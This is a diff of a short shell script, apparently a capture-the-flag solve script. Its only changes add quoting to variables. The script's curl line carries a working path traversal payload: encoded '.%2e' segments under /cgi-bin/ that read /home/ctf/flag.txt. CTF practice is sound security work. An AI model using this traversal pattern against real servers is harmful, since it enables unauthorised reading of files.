@@ -12,12 +12,12 @@ then
 elif [[ $# -ne 2 ]]
 then
     echo "Usage:"
-    echo $0" {local,remote}"
+    echo "$0"" {local,remote}"
     echo "or"
-    echo $0" <ip> <port>"
+    echo "$0"" <ip> <port>"
     exit 1
 else
     URL=$1':'$2
 fi
 
-curl $URL/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt
+curl "$URL"/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/ctf/flag.txt
